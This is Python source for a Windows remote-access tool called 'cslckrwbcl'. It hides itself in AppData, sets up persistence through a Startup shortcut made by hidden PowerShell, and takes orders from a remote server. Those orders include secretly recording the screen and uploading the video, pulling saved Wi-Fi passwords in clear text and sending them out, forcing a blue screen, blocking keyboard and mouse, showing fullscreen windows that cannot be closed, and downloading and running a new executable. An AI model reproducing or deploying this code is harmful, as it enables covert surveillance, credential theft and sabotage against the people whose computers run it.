import os
import sys
import bsod
import time
import socket
import ctypes
import shutil
import webview
import requests
import keyboard
import threading
import subprocess
from time import sleep

computer_name = socket.gethostname()
version = '1.01.1'

appdata_roaming = os.environ.get('APPDATA')
destination = os.path.join(appdata_roaming, '.cslckrwbcl')
screen_recordings_dir = os.path.join(destination, "screen_recordings")
destination_exe = os.path.join(destination, 'cslckrwbcl.exe')
exe = sys.executable
startup_shortcut_path = os.path.join(appdata_roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "cslckrwbcl.lnk")

def create_shortcut():
    os.makedirs(destination, exist_ok=True)
    os.makedirs(screen_recordings_dir, exist_ok=True)

    if not os.path.exists(destination_exe):
        if os.path.abspath(exe) != os.path.abspath(destination_exe):
            shutil.copy2(exe, destination_exe)

        ctypes.windll.kernel32.SetFileAttributesW(destination, 0x02)
    else:
        pass

    powershell_script = f"""
        $shell = New-Object -ComObject WScript.Shell;
        $shortcut = $shell.CreateShortcut('{startup_shortcut_path}');
        $shortcut.TargetPath = '{destination_exe}';
        $shortcut.Description = '';
        $shortcut.Save();
    """

    powershell_args = [
        "powershell.exe",
        "-ExecutionPolicy", "Bypass",
        "-Command", powershell_script
    ]

    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = subprocess.SW_HIDE
    subprocess.run(powershell_args, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, startupinfo=startupinfo)

if os.path.abspath(exe) != os.path.abspath(destination_exe):
    create_shortcut()
    subprocess.Popen([destination_exe], shell=False)
    os._exit(0)

def on_closing():
    return False

if __name__ == "__main__":
    
    requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={'computer_name': computer_name})
    window = webview.create_window(f"cslckrwbcl", "https://cslckrwbcl.lrdevstudio.com", frameless=True, resizable=False, fullscreen=True, draggable=False, zoomable=False)
    window.events.closing += on_closing
    def check_commands():
        while True:
            try:
                response = requests.get('https://cslckrwbcl.lrdevstudio.com/messages')
                data = response.json()
                if data != [] and data != None:
                    wbdata = data[0]
                    action = wbdata.get('action')
                    timestamp = wbdata.get('time')
                    duration = wbdata.get('duration')

                    if action == f'record-{computer_name}':
                        import imageio
                        import pyautogui
                        from numpy import array

                        print("Recording Started")

                        record_path = os.path.join(screen_recordings_dir, f"screen-recording-{computer_name}-{timestamp}.mp4")

                        fps = 20  # frames per second
                        duration_sec = duration
                        total_frames = fps * duration_sec

                        # Use imageio writer to encode H.264 MP4 with faststart
                        writer = imageio.get_writer(record_path, fps=fps, codec='libx264', ffmpeg_params=['-movflags', 'faststart'])

                        print(f"Recording {duration_sec}s at {fps}fps...")

                        for i in range(total_frames):
                            # Capture screen frame
                            img = pyautogui.screenshot()
                            frame = array(img)
                            writer.append_data(frame)
                            time.sleep(1/fps)

                        writer.close()
                        print("Recording stopped, saved file:", record_path)

                        # Send to server
                        with open(record_path, 'rb') as f:
                            files = {'video': f}
                            data = {'filename': os.path.basename(record_path)}
                            r = requests.post('https://cslckrwbcl.lrdevstudio.com/messages', files=files, data=data)
                        print("Video sent, server responded:", r.text)
                    elif action == f'delete-video':
                        for filename in os.listdir(os.path.join(os.getcwd(), 'screen_recordings')):
                            file_path = os.path.join(os.path.join(os.getcwd(), 'screen_recordings'), filename)
                            os.remove(file_path)
                        print('Deleted all videos')
                    elif action == f'flash-{computer_name}':
                        print("Flashing URL...")
                        window.show()
                        window.load_url('https://cslckrwbcl.lrdevstudio.com/flash')
                        time.sleep(20)
                        window.load_url('https://cslckrwbcl.lrdevstudio.com/success')
                    elif action == f'network-passwords-{computer_name}':
                        print('Network passwords requested')
                        networks = []

                        profiles_output = subprocess.check_output((["netsh", "wlan", "show", "profiles"])).decode(errors="ignore")
                        profiles = []

                        for line in profiles_output.splitlines():
                            if "All User Profile" in line:
                                profiles.append(line.split(":")[1].strip())

                        for name in profiles:
                            profile_output = subprocess.check_output(["netsh", "wlan", "show", "profile", name, "key=clear"]).decode(errors="ignore")

                            for line in profile_output.splitlines():
                                if "Key Content" in line:
                                    password = line.split(":")[1].strip()
                                    break

                            networks.append([name, password])

                        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json={f'all-network-passwords-{computer_name}': networks})
                    elif action == f'bsod-{computer_name}':
                        print("BSOD-ed!")
                        bsod()
                    elif action == f'jumpscare-{computer_name}':
                        print('Jumpscaring')
                        count = 0
                        while count != int(data[0].get('data')):
                            webview.create_window(f"({count}) cslckrwbcl", "https://cslckrwbcl.lrdevstudio.com/flash", frameless=True, resizable=False, fullscreen=True, draggable=False, zoomable=False)
                            count += 1
                    elif action == f'blockinput-{computer_name}':
                        print("Blocking input...")
                        bsod.block_keyboard()
                        bsod.block_mouse()
                    elif action == f'hidewbcl-{computer_name}':
                        print("Hiding Application")
                        window.hide()
                        window.load_url('https://cslckrwbcl.lrdevstudio.com/neutral')
                    elif action == f'updatewbcl-{computer_name}':
                        print("Update requested")
                        BASE_URL = "https://cslckrwbcl.lrdevstudio.com/resources"

                        old_exe = os.path.join(destination, "cslckrwbcl.exe")
                        new_temp_exe = os.path.join(destination, "cslckrwbcln.exe")
                        updater_exe = os.path.join(destination, "cslckrwbcl updater.exe")

                        print("Downloading updater...")
                        response = requests.get(f"{BASE_URL}/cslckrwbcl%20updater.exe", stream=True, timeout=30)
                        response.raise_for_status()

                        with open(updater_exe, "wb") as f:
                            for chunk in response.iter_content(8192):
                                if chunk:
                                    f.write(chunk)

                        subprocess.Popen([updater_exe, "update"], shell=False)

                        os._exit(0)
                    elif "computer_name" not in data[0]:
                        print(f'Refunded: {data}')
                        requests.post('https://cslckrwbcl.lrdevstudio.com/messages', json=data[0])
            except Exception as e:
                # keyboard.press_and_release('windows+r')
                # keyboard.write('chrome.exe', delay=0.05)
                print("Error fetching commands:", e)
            sleep(1)

    thread = threading.Thread(target=check_commands, daemon=True)
    thread.start()
    webview.start()

# pyinstaller --workpath ../cslckrwbcl-builds --distpath output .\cslckrwbcl.spec --clean --upx-dir="C:\Users\raedh\AppData\Local\Microsoft\WinGet\Packages\UPX.UPX_Microsoft.Winget.Source_8wekyb3d8bbwe\upx-5.1.0-win64\"